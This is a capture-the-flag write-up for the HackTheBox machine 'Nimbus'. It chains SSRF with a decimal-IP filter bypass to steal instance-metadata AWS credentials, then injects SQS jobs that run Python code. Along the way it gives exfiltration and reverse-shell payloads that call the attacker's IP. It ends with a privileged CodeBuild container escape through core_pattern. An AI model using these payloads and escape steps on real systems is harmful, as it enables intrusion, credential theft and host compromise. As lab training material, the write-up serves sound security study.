Nimbus
https://app.hackthebox.com/machines/Nimbus


Summary
Nimbus exposes a small web application for an internal job scheduler. The key entrypoint is the unauthenticated job submission flow: users can submit a job either by pasting YAML directly or by giving the app a URL to fetch YAML from. The URL mode is especially useful because the server fetches the supplied URL, which turns the job submitter into an SSRF primitive. From there, the path is to read instance metadata, steal temporary AWS credentials, and use those credentials to interact with the nimbus-jobs SQS queue.

From there, the queue is writable and consumed by a worker. The worker parses each SQS message with unsafe PyYAML and, when the job contains a script key, runs that script with python3 -c. This gives code execution as the worker user inside the worker container.

Enumerate 22/tcp and 80/tcp.

Add or resolve nimbus.htb.

Find aws.nimbus.htb from the healthcheck endpoint.

Use the URL-based job submission/preview flow as SSRF.

Bypass internal URL blocking with integer-form metadata IP.

Steal temporary IAM role credentials.

Use the credentials to list and write to the nimbus-jobs SQS queue.

Send a JSON/YAML job containing runtime: python3.11 and script.

Get code execution as worker and read the user flag.

Enumeration
Start with a full TCP port scan:


Copy
nmap -p- --min-rate 5000 -Pn 10.129.3.25 -oN nmap-allports.txt
Only SSH and HTTP were open:


Copy
22/tcp open  ssh
80/tcp open  http
Then fingerprint the services:


Copy
nmap -sCV -p22,80 -Pn 10.129.3.25 -oN nmap-scv.txt
Important results:


Copy
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
http-title: Did not follow redirect to http://nimbus.htb/
The web server redirects by hostname, so use /etc/hosts or curl's --resolve option:


Copy
echo '10.129.3.25 nimbus.htb aws.nimbus.htb' | sudo tee -a /etc/hosts
If you do not want to edit /etc/hosts, use:


Copy
curl --resolve nimbus.htb:80:10.129.3.25 http://nimbus.htb/
Web Application
The home page identifies the app:


Copy
Nimbus - Internal Job Scheduler
nimbus v1.4.2
Useful links:


Copy
/jobs
/login
/api/v1/health
/login says SSO is temporarily unavailable and that the job submitter is unauthenticated during migration. /jobs accepts either a raw Git URL or pasted YAML and sends it to /jobs/preview.

The health endpoint leaks the internal AWS-style hostname:


Copy
curl http://nimbus.htb/api/v1/health
Response:


Copy
{
  "services": {
    "queue": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "scheduler": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "storage": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    }
  },
  "status": "healthy",
  "version": "1.4.2"
}
Virtual host fuzzing confirms aws.nimbus.htb:


Copy
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.3.25/ \
  -H 'Host: FUZZ.nimbus.htb' \
  -fs 178
Result:


Copy
aws  [Status: 403, Size: 305]
Job Submission Entrypoint
The /jobs page exposes two ways to submit a job:

URL mode: provide a raw URL to a .yaml or .yml file.

YAML mode: paste a YAML job definition directly.

YAML mode proves the app accepts arbitrary job structure, but URL mode is the stronger entrypoint because /jobs/preview fetches the supplied YAML URL server-side and displays the raw response. Test with a local file:


Copy
name: probe
schedule: "* * * * *"
runtime: python3.11
Serve it:


Copy
python3 -m http.server 8000 --bind 10.10.16.156
Submit it:


Copy
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://10.10.16.156:8000/probe.yaml'
The preview page fetches and parses the YAML. That confirms the backend is making outbound HTTP requests on our behalf.

Direct internal URLs are blocked:


Copy
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/foo.yaml'
Response:


Copy
Security policy: this URL targets an internal resource and has been blocked.
However, the filter can be bypassed with integer-form IPv4. 169.254.169.254 as a decimal integer is:


Copy
python3 - <<'PY'
import ipaddress
print(int(ipaddress.IPv4Address("169.254.169.254")))
PY
Output:


Copy
2852039166
The endpoint also requires the URL to end in .yaml or .yml. A query string or fragment satisfies the app check while the metadata service still receives the real path:


Copy
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/?x=.yaml'
The raw response reveals the role name:


Copy
nimbus-web-role
Fetch the role credentials:


Copy
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml'
The response contains temporary AWS credentials:



<h3>Raw response</h3><pre>{
  &#34;Code&#34;: &#34;Success&#34;,
  &#34;LastUpdated&#34;: &#34;2026-06-22T05:10:47Z&#34;,
  &#34;Type&#34;: &#34;AWS-HMAC&#34;,
  &#34;AccessKeyId&#34;: &#34;ASIAQX4PG7L2K9M3N5R8&#34;,
  &#34;SecretAccessKey&#34;: &#34;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#34;,
  &#34;Token&#34;: &#34;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#34;,
  &#34;Expiration&#34;: &#34;2026-06-22T11:10:47Z&#34;
}</pre>
<h3>Parsed</h3><pre>{&#39;Code&#39;: &#39;Success&#39;, &#39;LastUpdated&#39;: &#39;2026-06-22T05:10:47Z&#39;, &#39;Type&#39;: &#39;AWS-HMAC&#39;, &#39;AccessKeyId&#39;: &#39;ASIAQX4PG7L2K9M3N5R8&#39;, &#39;SecretAccessKey&#39;: &#39;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#39;, &#39;Token&#39;: &#39;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#39;, &#39;Expiration&#39;: &#39;2026-06-22T11:10:47Z&#39;}</pre>
</div>



Copy
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-22T11:10:47Z"
}
Using The AWS Credentials
aws.nimbus.htb is host-based behind nginx. If DNS is configured in /etc/hosts, use it directly:



Copy
export AWS_ACCESS_KEY_ID='ASIAQX4PG7L2K9M3N5R8'
export AWS_SECRET_ACCESS_KEY='bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs'
export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM'
export AWS_DEFAULT_REGION=us-east-1

aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
If you cannot edit /etc/hosts, run a tiny local forwarder that connects to 10.129.3.25 while forcing Host: aws.nimbus.htb, then point the AWS CLI at 127.0.0.1:4566.

Confirmed identity:


Copy
 aws --endpoint-url http://aws.nimbus.htb \
    sts get-caller-identity
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}

List SQS queues:


Copy
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
Result:


Copy
 aws --endpoint-url http://aws.nimbus.htb sqs list-queues
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}

The role can read queue attributes and send messages:


Copy
   aws --endpoint-url http://aws.nimbus.htb sqs get-queue-attributes \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --attribute-names All
{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1782101824",
        "LastModifiedTimestamp": "1782101824",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}


Copy
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body '{"name":"probe","command":"id"}'
{
    "MD5OfMessageBody": "f6faa340507aeb3afe4a12ee66101e13",
    "MessageId": "9f8ac84d-68fd-4e74-8f38-15570ee6f89e"
}

ReceiveMessage is denied, but ApproximateNumberOfMessages drops back to 0, confirming that a worker consumes queue entries.

Foothold Direction
The basic exploitation direction is to turn job submission into worker-side code execution. The public app says jobs are submitted to queue nimbus-jobs and picked up by workers running nimbus/worker. After the metadata SSRF gives AWS credentials, we can bypass the web UI and submit directly to SQS.

The accepted worker job format is simple JSON or YAML. The key field is script; the worker passes it to python3 -c.


Copy
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body '{
    "name": "callback",
    "schedule": "* * * * *",
    "runtime": "python3.11",
    "script": "import urllib.request; urllib.request.urlopen(\"http://10.10.16.156:8000/callback\")"
  }'
Then watch your listener:


Copy
python3 -m http.server 8000 --bind 10.10.16.156
For command output, make the Python job run a shell command and POST the result back:


Copy
{
  "name": "cmd",
  "schedule": "* * * * *",
  "runtime": "python3.11",
  "script": "import subprocess, urllib.request; p=subprocess.run('id; hostname; pwd', shell=True, capture_output=True, text=True); urllib.request.urlopen(urllib.request.Request('http://10.10.16.156:8002/out', data=p.stdout.encode(), method='POST'))"
}
The worker source confirms the bug:


Copy
job = yaml.load(body, Loader=yaml.Loader)
script = job.get("script", "")
subprocess.run(["python3", "-c", script], capture_output=True, text=True, timeout=30)
A reverse shell also works, although in this environment it was easier to use HTTP POST exfiltration:


Copy
python3 - <<'PY'
import os, pty, socket
s = socket.socket()
s.connect(("10.10.16.156", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
PY
Listener:


Copy
nc -lvnp 4444
The shell lands as:


Copy
uid=1000(worker) gid=1000(worker) groups=1000(worker)
hostname: 23c094f7b01b
cwd: /app
The user flag is in:


Copy
/home/worker/user.txt
Do not include the flag value in the public writeup.

Post-Exploitation Checklist
After getting a shell:


Copy
id
hostname
ip addr
pwd
ls -la /home
find /home -name user.txt -type f 2>/dev/null
Upgrade the shell:


Copy
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Check common privilege escalation routes:


Copy
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ss -lntp
ps auxww
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'
Given the cloud theme, also inspect local AWS material and worker configuration:


Copy
env | grep -i aws
find / -iname '*nimbus*' -o -iname '*worker*' 2>/dev/null
find / -path '*/.aws/*' -type f 2>/dev/null
The worker environment contains a second role:

worker@883d81d4990d:/app$ env | grep -i aws
env | grep -i aws
AWS_DEFAULT_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_ENDPOINT_URL=http://aws.nimbus.htb
worker@883d81d4990d:/app$ find / -iname '*nimbus*' -o -iname '*worker*' 2>/dev/null
< -iname '*nimbus*' -o -iname '*worker*' 2>/dev/null
/usr/local/lib/python3.11/site-packages/urllib3/contrib/emscripten/emscripten_fetch_worker.js
/usr/lib/python3.13/test/libregrtest/worker.py
/usr/lib/python3.13/test/libregrtest/__pycache__/run_workers.cpython-313.pyc
/usr/lib/python3.13/test/libregrtest/__pycache__/worker.cpython-313.pyc
/usr/lib/python3.13/test/libregrtest/run_workers.py
/usr/lib/python3/dist-packages/urllib3/contrib/emscripten/emscripten_fetch_worker.js
/home/worker
/app/worker.py


Copy
AWS_ACCESS_KEY_ID=<REDACTED>
AWS_SECRET_ACCESS_KEY=<REDACTED>
AWS_ENDPOINT_URL=http://aws.nimbus.htb
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
Those credentials identify as nimbus-worker-role. They can receive/delete queue messages, but in testing they did not allow S3 listing, Secrets Manager listing, IAM listing, Lambda creation, EC2 describe, or SSM command execution.

Container enumeration showed:


Copy
No effective Linux capabilities.
No docker/containerd socket mounted.
/home/worker/user.txt is readable by group worker.
/root/root.txt exists but is not readable as worker.
Root
The worker container itself is intentionally locked down, so the root path pivots back through the internal AWS emulator. The worker can reach the emulator as floci:4566, and the emulator exposes CodeBuild.

From the worker RCE, create a CodeBuild project that runs a privileged container:


Copy
worker@883d81d4990d:/app$ cat create_project.py                                                                                                                                                                                                                                                                              
cat create_project.py                                                                                                                                                                                                                                                                                                        
import boto3                                                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                                             
cb = boto3.client(                                                                                                                                                                                                                                                                                                           
    "codebuild",                                                                                                                                                                                                                                                                                                             
    region_name="us-east-1",                                                                                                                                                                                                                                                                                                 
    endpoint_url="http://floci:4566",                                                                                                                                                                                                                                                                                        
    aws_access_key_id="test",                                                                                                                                                                                                                                                                                                
    aws_secret_access_key="test",                                                                                                                                                                                                                                                                                            
)                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                             
cb.create_project(                                                                                                                                                                                                                                                                                                           
    name="nimbus-root",                                                                                                                                                                                                                                                                                                      
    source={"type": "NO_SOURCE"},                                                                                                                                                                                                                                                                                            
    artifacts={"type": "NO_ARTIFACTS"},                                                                                                                                                                                                                                                                                      
    environment={                                                                                                                                                                                                                                                                                                            
        "type": "LINUX_CONTAINER",                                                                                                                                                                                                                                                                                           
        "computeType": "BUILD_GENERAL1_SMALL",                                                                                                                                                                                                                                                                               
        "image": "floci/floci:latest",                                                                                                                                                                                                                                                                                       
        "privilegedMode": True,                                                                                                                                                                                                                                                                                              
    },                                                                                                                                                                                                                                                                                                                       
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",                                                                                                                                                                                                                                                             
)                                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                             
print("[+] Project created")  


The floci/floci:latest entrypoint tries to drop privileges based on the output of id. Override id with an exported bash function so the check sees uid=1000, while the build process stays real UID 0:


Copy
worker@883d81d4990d:/app$ cat > start_build.py << 'EOF'
import boto3

cb = boto3.client(
    "codebuild",
    region_name="us-east-1",
    endpoint_url="http://floci:4566",
    aws_access_key_id="test",
    aws_secret_access_key="test",
)

buildspec = """
version: 0.2
phases:
  build:
    commands:
      - echo "test build running"
"""

response = cb.start_build(
    projectName="nimbus-root",
    environmentVariablesOverride=[
        {
            "name": "BASH_FUNC_id%%",
            "value": "() { echo uid=1000; }",
            "type": "PLAINTEXT",
        }
    ],
    buildspecOverride=buildspec,
)

print(response)
EOFcat > start_build.py << 'EOF'

> import boto3
> 
> cb = boto3.client(
>     "codebuild",
>     region_name="us-east-1",
>     endpoint_url="http://floci:4566",
>     aws_access_key_id="test",
>     aws_secret_access_key="test",
> )
> 
> buildspec = """
> version: 0.2
> phases:
>   build:
>     commands:
>       - echo "test build running"
> """
> 
> response = cb.start_build(
>     projectName="nimbus-root",
>     environmentVariablesOverride=[
>         {
>             "name": "BASH_FUNC_id%%",
>             "value": "() { echo uid=1000; }",
>             "type": "PLAINTEXT",
>         }
>     ],
>     buildspecOverride=buildspec,
> )
> 
> print(response)
> EOF
worker@883d81d4990d:/app$ python3 start_build.py
python3 start_build.py
{'build': {'id': 'nimbus-root:1', 'arn': 'arn:aws:codebuild:us-east-1:847219365028:build/nimbus-root:1', 'buildNumber': 1, 'startTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 447000, tzinfo=tzlocal()), 'currentPhase': 'DOWNLOAD_SOURCE', 'buildStatus': 'IN_PROGRESS', 'projectName': 'nimbus-root', 'phases': [{'phaseType': 'SUBMITTED', 'phaseStatus': 'SUCCEEDED', 'startTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 448000, tzinfo=tzlocal()), 'endTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 448000, tzinfo=tzlocal()), 'durationInSeconds': 0}, {'phaseType': 'QUEUED', 'phaseStatus': 'SUCCEEDED', 'startTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 448000, tzinfo=tzlocal()), 'endTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 448000, tzinfo=tzlocal()), 'durationInSeconds': 0}, {'phaseType': 'PROVISIONING', 'phaseStatus': 'SUCCEEDED', 'startTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 448000, tzinfo=tzlocal()), 'endTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 449000, tzinfo=tzlocal()), 'durationInSeconds': 0}, {'phaseType': 'DOWNLOAD_SOURCE', 'phaseStatus': 'IN_PROGRESS', 'startTime': datetime.datetime(2026, 6, 22, 5, 43, 38, 449000, tzinfo=tzlocal())}], 'source': {'type': 'NO_SOURCE'}, 'artifacts': {}, 'environment': {'environmentVariables': [{'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}]}, 'timeoutInMinutes': 60, 'queuedTimeoutInMinutes': 480, 'buildComplete': False, 'initiator': 'user'}, 'ResponseMetadata': {'RequestId': '19080c49-b3da-4aec-a4c8-01611e2640fa', 'HTTPStatusCode': 200, 'HTTPHeaders': {'content-type': 'application/x-amz-json-1.1;charset=UTF-8', 'content-length': '1001', 'date': 'Mon, 22 Jun 2026 05:43:38 GMT', 'x-amz-id-2': '19080c49-b3da-4aec-a4c8-01611e2640fa', 'x-amz-request-id': '19080c49-b3da-4aec-a4c8-01611e2640fa', 'x-amzn-requestid': '19080c49-b3da-4aec-a4c8-01611e2640fa'}, 'RetryAttempts': 0}}
worker@883d81d4990d:/app$
Inside the privileged build container, use the classic core_pattern usermode-helper escape:

Read /proc/self/mountinfo and extract the overlay upperdir.

Write a helper script inside the build container.

Reference the helper by its host-visible upperdir path.

Set /proc/sys/kernel/core_pattern to pipe crashes into that helper.

Trigger a crash.

worker@883d81d4990d:/app$ aws --region us-east-1 \                                                                                                                                                                                                            
  --endpoint-url http://floci:4566 \                                                                                                                                                                                                                          
  codebuild batch-get-builds \                                                                                                                                                                                                                                
  --ids nimbus-root:1aws --region us-east-1 \                                                                                                                                                                                                                 
>   --endpoint-url http://floci:4566 \                                                                                                                                                                                                                        
>   codebuild batch-get-builds \                                                                                                                                                                                                                              
>                                                                                                                                                                                                                                                             
  --ids nimbus-root:1                                                                                                                                                                                                                                         
WARNING: terminal is not fully functional                                                                                                                                                                                                                     
Press RETURN to continue                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                              
{                                                                                                                                                                                                                                                             
    "builds": [                                                                                                                                                                                                                                               
        {                                                                                                                                                                                                                                                     
            "id": "nimbus-root:1",                                                                                                                                                                                                                            
            "arn": "arn:aws:codebuild:us-east-1:847219365028:build/nimbus-root:1                                                                                                                                                                              
",                                                                                                                                                                                                                                                            
            "buildNumber": 1,                                                                                                                                                                                                                                 
            "startTime": "2026-06-22T05:43:38.447000+00:00",                                                                                                                                                                                                  
            "endTime": "2026-06-22T05:43:39.020000+00:00",                                                                                                                                                                                                    
            "currentPhase": "COMPLETED",
            "buildStatus": "SUCCEEDED",
            "projectName": "nimbus-root",
            "phases": [
                {
                    "phaseType": "SUBMITTED",
                    "phaseStatus": "SUCCEEDED",
                    "startTime": "2026-06-22T05:43:38.448000+00:00",
                    "endTime": "2026-06-22T05:43:38.448000+00:00",
                    "durationInSeconds": 0
                },
                {
                    "phaseType": "QUEUED",
                    "phaseStatus": "SUCCEEDED",
:[ble: EOF]




worker@883d81d4990d:/app$ aws --region us-east-1 \
  --endpoint-url http://floci:4566 \
  logs describe-log-streams \
  --log-group-name /aws/codebuild/nimbus-rootaws --region us-east-1 \
> 
  --endpoint-url http://floci:4566 \
>   logs describe-log-streams \
>   --log-group-name /aws/codebuild/nimbus-root
WARNING: terminal is not fully functional
Press RETURN to continue 

{
    "logStreams": [
        {
            "logStreamName": "2026/06/22/nimbus-root/1",
            "lastIngestionTime": 0,
            "uploadSequenceToken": "cb6b3b87-809b-4327-84e8-fef84f2afd10",
            "storedBytes": 0
        }
    ]
}


worker@883d81d4990d:/app$ aws --region us-east-1 \
  --endpoint-url http://floci:4566 \
  logs get-log-events \
  --log-group-name /aws/codebuild/nimbus-root \
  --log-stream-name 2026/06/22/nimbus-root/1aws --region us-east-1 \
>   --endpoint-url http://floci:4566 \
>   logs get-log-events \
>   --log-group-name /aws/codebuild/nimbus-root \
> 
  --log-stream-name 2026/06/22/nimbus-root/1
WARNING: terminal is not fully functional
Press RETURN to continue 

{
    "events": [],
    "nextForwardToken": "f/0",
    "nextBackwardToken": "b/0"
}
worker@883d81d4990d:/app$ 



The useful build commands look like this:


Copy
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

worker@883d81d4990d:/app$ cat /proc/self/mountinfo      
cat /proc/self/mountinfo
411 365 0:46 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/165/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/33/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/15/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/14/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/13/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/12/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/work,nouserxattr
413 411 0:64 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
414 411 0:65 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
415 414 0:66 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
416 411 0:67 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
417 416 0:29 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
418 414 0:62 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
419 414 0:68 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64
420 411 8:4 /var/lib/docker/containers/883d81d4990d7d78d4aa3105d5b3434a7fdb164ddc24274dad983e264fa703f2/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
421 411 8:4 /var/lib/docker/containers/883d81d4990d7d78d4aa3105d5b3434a7fdb164ddc24274dad983e264fa703f2/hostname /etc/hostname rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
422 411 8:4 /var/lib/docker/containers/883d81d4990d7d78d4aa3105d5b3434a7fdb164ddc24274dad983e264fa703f2/hosts /etc/hosts rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
366 413 0:64 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
367 413 0:64 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
368 413 0:64 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
369 413 0:64 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
370 413 0:64 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
371 413 0:69 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64
375 413 0:65 /null /proc/interrupts rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
376 413 0:65 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
377 413 0:65 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
378 413 0:65 /null /proc/latency_stats rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
379 413 0:70 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64
380 413 0:65 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
398 416 0:71 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64
worker@883d81d4990d:/app$ 


cat > /exploit_root.sh <<EOF
#!/bin/sh
cat /root/root.txt > "$UDIR/rootflag.txt"
chmod 777 "$UDIR/rootflag.txt"
EOF

chmod +x /exploit_root.sh
echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern
ulimit -c unlimited
bash -c 'kill -11 $$'
sleep 4
cat /rootflag.txt
That executes the helper as host root and copies /root/root.txt into a location readable from the privileged build container.

Do not include the root flag value in the public writeup.

Key Lessons
Always follow host redirects; nimbus.htb was required for the real app.

Healthcheck endpoints often leak internal service names.

SSRF blocklists can miss alternate IP formats such as decimal IPv4.

File-extension allowlists can sometimes be bypassed with query strings or fragments.

Temporary IAM credentials are still powerful if scoped to one useful action like sqs:SendMessage.

A writable queue with an active worker is usually an execution path, even when direct receive/log permissions are denied.

If obvious command fields do nothing, inspect or infer the worker schema. Here the winning field was script, executed by Python.

Unsafe yaml.load(..., Loader=yaml.Loader) remains dangerous, but the simpler intended path was the worker's explicit script execution.

A locked-down first container can still be a bridge into a more privileged build/runtime service.

In privileged containers, writable core_pattern plus a host-visible overlay path can become host-root code execution.

Last updated 1 day ago